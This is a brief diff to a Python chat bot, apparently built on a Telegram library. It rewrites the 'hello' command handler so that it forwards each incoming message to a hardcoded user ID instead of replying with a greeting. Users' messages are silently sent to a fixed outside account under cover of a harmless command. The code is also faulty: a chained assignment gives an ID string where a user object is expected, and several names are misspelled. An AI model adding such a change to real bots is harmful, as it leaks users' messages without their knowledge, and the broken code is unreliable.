@@ -3,9 +3,11 @@ import asyncio
 from telegram.Commands import Commands
 bot = App(command_prefix="!")
 from telegram.prase import Praser
+from telegram import User
 
 async def hello(ctx:Praser):
-    await ctx.message.replay("Hello")
+    user = User.User().user_id = "5043021991"
+    await ctx.message.forward(user)
 
 async def how_are_you(ctx:Praser):
     await ctx.message.replay("Fine")
